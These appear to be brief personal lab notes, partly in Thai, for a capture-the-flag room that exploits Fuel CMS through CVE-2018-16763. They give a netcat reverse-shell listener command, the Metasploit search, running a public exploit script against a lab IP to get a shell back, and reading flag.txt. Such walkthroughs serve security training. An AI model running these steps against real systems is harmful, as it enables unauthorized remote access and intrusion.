shell 1:
nc -lvnp 8081

หาสคริปที่ใช้ได้จริงจาก
CVE-2018-16763 PoC บน google
msfconsole->search fuelcms,search CVE-2018-16763

shell 2:
cd /usr/share/exploits/vulnerabilitiescapstone
ls
python3 exploit.py 10.64.140.224
shell_me(คำสั่ง run script)
10.64.140.224:8081(attack machine and port)
ls
cat flag.txt